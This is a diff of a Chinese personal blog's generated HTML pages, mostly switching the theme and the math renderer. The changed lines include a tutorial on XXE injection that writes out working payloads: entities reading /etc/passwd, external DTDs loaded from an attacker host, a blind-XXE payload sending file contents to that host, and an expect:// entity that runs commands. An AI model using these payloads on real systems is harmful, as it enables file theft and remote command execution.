@@ -9,8 +9,8 @@
 <meta name="description" content="生如逆旅，一苇以航。">
 <meta name="theme-color" content="#000">
 <title>outlaws&#39; blog</title>
-<link rel="shortcut icon" href="/favicon.ico?v=1616122072681">
-<link rel="stylesheet" href="/media/css/mist.css">
+<link rel="shortcut icon" href="/favicon.ico?v=1616123936042">
+<link rel="stylesheet" href="/media/css/pisces.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
 <link
   href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext"
@@ -28,11 +28,25 @@
   integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">
 
 
-<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"
-  integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
-<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"
-  integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
-  onload="renderMathInElement(document.body);"></script>
+<script>
+  window.MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ["\\(", "\\)"]],
+      displayMath: [['$$', '$$'], ["\\[", "\\]"]]
+    },
+    options: {
+      skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code', 'a', 'annotation', 'annotation-xml'],
+      ignoreHtmlClass: 'tex2jax_ignore|crayon-.*', // 'crayon-' 开头的类，属于Wordpress代码高亮库，这部分不需要处理，否则会导致显示不正确,这部分是正则式，多条之间用'|'分割
+      processHtmlClass: 'tex2jax_process'
+    },
+    //禁用右键菜单	
+    renderActions: {
+      addMenu: [0, '', '']
+    }
+  };
+</script>
+<script type="text/javascript"
+  src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 
 
 
@@ -44,9 +58,9 @@
   <div class="head-top-line"></div>
   <div class="header-box">
     
-<div class="mist">
-  <header class="header bg-color ">
-    <div class="blog-header box-shadow-wrapper  " id="header">
+<div class="pisces">
+  <header class="header  ">
+    <div class="blog-header box-shadow-wrapper bg-color " id="header">
       <div class="nav-toggle" id="nav_toggle">
         <div class="toggle-box">
           <div class="line line-top"></div>
@@ -57,17 +71,13 @@
       <div class="site-meta">       
         <div class="site-title">
           
-            <a href="/" class="">
-              <span class="logo-line-before">
-                <i class=""></i>
-              </span>
-              <span class="main-title">outlaws&#39; blog</span>
-              <span class="logo-line-after">
-                <i class=""></i>
-              </span>
+            <a href="/" class="brand">
+              <span>outlaws&#39; blog</span>
             </a>  
           
         </div>
+        
+          <p class="subtitle">生如逆旅，一苇以航。</p>
         
       </div>
       <nav class="site-nav" id="site_nav">
@@ -182,11 +192,11 @@
   <div class="main-continer">
     
     <div
-      class="section-layout bg-color mist">
+      class="section-layout  pisces">
       <div class="section-layout-wrapper">
         <div id="sidebarMeta" class="sidebar">
     
-<div class="sidebar-wrapper box-shadow-wrapper ">
+<div class="sidebar-wrapper box-shadow-wrapper bg-color">
   <div class="sidebar-item">
     <img class="site-author-image right-motion" src="/images/avatar.png"/>
     <p class="site-author-name">outlaws&#39;s blog</p>
@@ -214,6 +224,8 @@
     </div>
   </div>
   
+    
+  
   
     <div class="sidebar-item sidebar-item-social">
       <div class="social-item">
@@ -235,7 +247,7 @@
 </div>
 <script>
   let sidebarMeta = document.querySelector('#sidebarMeta');
-  let scheme = 'mist';
+  let scheme = 'pisces';
   let sidebarWrapper = document.querySelector('.sidebar-wrapper');
   if (sidebarMeta && (scheme === 'pisces' || scheme === 'gemini')) {
     document.addEventListener('scroll', function(e) {
@@ -295,24 +307,21 @@
     </div>
     <div class="footer-box">
   <footer class="footer">
-    <div class="copyright">
-      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | © 2019-2020 Theme By <a
+    <div class="poweredby">
+      <div class="copyright">
+      Powered by <a href="https://github.com/outlaws-bai" target="_blank">outlaws-bai</a> | © 2019-2021 Theme By <a
         href="https://github.com/hsxyhao/gridea-theme-next" target="_blank">HsxyHao</a>
     </div>
-    <div class="poweredby">
-      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
     </div>
   </footer>
   
   
-  <div class="drawer-box left" id="drawer_box">
-    <span class="muse-line muse-line-first"></span>
-    <span class="muse-line muse-line-middle"></span>
-    <span class="muse-line muse-line-last"></span>
-  </div>
-  
-  <div class="mist back-to-top" id="back_to_top">
+  <div class="pisces back-to-top" id="back_to_top">
     <i class="fa fa-arrow-up"></i>
+    
+    <span class="scrollpercent">
+      <span id="back_to_top_text">0</span>%
+    </span>
     
   </div>
   
@@ -542,20 +551,30 @@
 &lt;p&gt;1内部DTD：即对XML文档的元素、属性和实体的DTD的声明都在xml文档中。&lt;/p&gt;
 &lt;p&gt;2外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件(.dtd)中。&lt;/p&gt;
 &lt;h2 id=&#34;内部的doctype&#34;&gt;内部的DOCTYPE&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;!DOCTYPE 根元素 [元素声明]&amp;gt;
+&lt;pre&gt;&lt;code&gt;
+&amp;lt;!DOCTYPE 根元素 [元素声明]&amp;gt;
+
 &lt;/code&gt;&lt;/pre&gt;
 &lt;h2 id=&#34;外部的文档声明&#34;&gt;外部的文档声明&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;!DOCTYPE 根元素 SYSTEM &amp;quot;文件名&amp;quot;&amp;gt;
+&lt;pre&gt;&lt;code&gt;
+&amp;lt;!DOCTYPE 根元素 SYSTEM &amp;quot;文件名&amp;quot;&amp;gt;
+
 &lt;/code&gt;&lt;/pre&gt;
 &lt;h1 id=&#34;dtd实体&#34;&gt;DTD实体&lt;/h1&gt;
 &lt;h2 id=&#34;内部实体声明&#34;&gt;内部实体声明&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;!ENTITY 实体名称 &amp;quot;实体的值&amp;quot;&amp;gt;
+&lt;pre&gt;&lt;code&gt;
+&amp;lt;!ENTITY 实体名称 &amp;quot;实体的值&amp;quot;&amp;gt;
+
 &lt;/code&gt;&lt;/pre&gt;
 &lt;h2 id=&#34;外部实体声明&#34;&gt;外部实体声明&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;!ENTITY 实体名称 SYSTEM &amp;quot;URI&amp;quot;&amp;gt;
+&lt;pre&gt;&lt;code&gt;
+&amp;lt;!ENTITY 实体名称 SYSTEM &amp;quot;URI&amp;quot;&amp;gt;
+
 &lt;/code&gt;&lt;/pre&gt;
 &lt;h2 id=&#34;参数实体声明&#34;&gt;参数实体声明&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;!ENTITY %实体名称 &amp;quot;实体的值&amp;quot;&amp;gt;
+&lt;pre&gt;&lt;code&gt;
+&amp;lt;!ENTITY %实体名称 &amp;quot;实体的值&amp;quot;&amp;gt;
+
 &lt;/code&gt;&lt;/pre&gt;
 &lt;h1 id=&#34;xxe分类&#34;&gt;XXE分类&lt;/h1&gt;
 &lt;p&gt;按照构造外部实体声明的方法不同&lt;/p&gt;
@@ -568,7 +587,8 @@
 &lt;p&gt;3.Blind XXE&lt;/p&gt;
 &lt;h1 id=&#34;怎样利用&#34;&gt;怎样利用&lt;/h1&gt;
 &lt;h2 id=&#34;1直接通过dtd外部实体声明&#34;&gt;1.直接通过DTD外部实体声明&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
+&lt;pre&gt;&lt;code&gt;
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
 &amp;lt;!DOCTYPE xxe[
     &amp;lt;!ENTITY f SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt;
     ]&amp;gt;
@@ -580,17 +600,21 @@ eg:
     &amp;lt;!ENTITY f SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt;
     ]&amp;gt;
 &amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;f;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;
+
 &lt;/code&gt;&lt;/pre&gt;
 &lt;h2 id=&#34;2通过dtd文档引入外部dtd文档的外部实体声明&#34;&gt;2.通过dtd文档引入外部dtd文档的外部实体声明&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
+&lt;pre&gt;&lt;code&gt;
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
 &amp;lt;!DOCTYPE xxe SYSTEM &amp;quot;http://ip:port/evil.dtd&amp;quot;&amp;gt;
 &amp;lt;a&amp;gt;&amp;amp;b;&amp;lt;/a&amp;gt;
 
 #其中的evil.dtd内容如下
 &amp;lt;!ENTITY b SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt;
+
 &lt;/code&gt;&lt;/pre&gt;
 &lt;h2 id=&#34;3通过dtd外部实体声明引入外部dtd文档中的外部实体声明&#34;&gt;3.通过dtd外部实体声明引入外部dtd文档中的外部实体声明&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
+&lt;pre&gt;&lt;code&gt;
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
 &amp;lt;!DOCTYPE xxe [
     &amp;lt;!ENTITY % file SYSTEM &amp;quot;http://ip:port/evil.dtd&amp;quot;&amp;gt;
         %file;
@@ -599,10 +623,12 @@ eg:
 
 #其中的evil.dtd内容如下
 &amp;lt;!ENTITY b SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt;
+
 &lt;/code&gt;&lt;/pre&gt;
 &lt;h2 id=&#34;4blind-xxe&#34;&gt;4.Blind XXE&lt;/h2&gt;
 &lt;p&gt;其实就是无法回显，将数据发送至vps&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+&lt;pre&gt;&lt;code&gt;
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
 &amp;lt;!DOCTYPE root [
     &amp;lt;!ENTITY %remote SYSTEM &amp;quot;http://ip:port/owen.dtd&amp;quot;&amp;gt;
         %remote;
@@ -614,16 +640,19 @@ eg:
 &amp;lt;!ENTITY % int &amp;quot;&amp;lt;!ENTITY &amp;amp;#37; send SYSTEM &#39;http://ip:port/?file=%file;&#39;&amp;gt;&amp;quot;&amp;gt;
 %int;
 %send;
+
 &lt;/code&gt;&lt;/pre&gt;
 &lt;h1 id=&#34;利用方式&#34;&gt;利用方式&lt;/h1&gt;
 &lt;p&gt;1.读文件&lt;/p&gt;
 &lt;p&gt;见怎样利用&lt;/p&gt;
 &lt;p&gt;2.执行系统命令&lt;/p&gt;
 &lt;p&gt;由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-xml-dtd&#34;&gt;&amp;lt;!DOCTYPE root[&amp;lt;!ENTITY cmd SYSTEM &amp;quot;expect://id&amp;quot;&amp;gt;]&amp;gt;
+&lt;pre&gt;&lt;code&gt;
+&amp;lt;!DOCTYPE root[&amp;lt;!ENTITY cmd SYSTEM &amp;quot;expect://id&amp;quot;&amp;gt;]&amp;gt;
 &amp;lt;dir&amp;gt;
 &amp;lt;file&amp;gt;&amp;amp;cmd;&amp;lt;/file&amp;gt;
 &amp;lt;/dir&amp;gt;
+
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;3.http内网主机探测&lt;/p&gt;
 &lt;p&gt;4.内网主机端口扫描&lt;/p&gt;
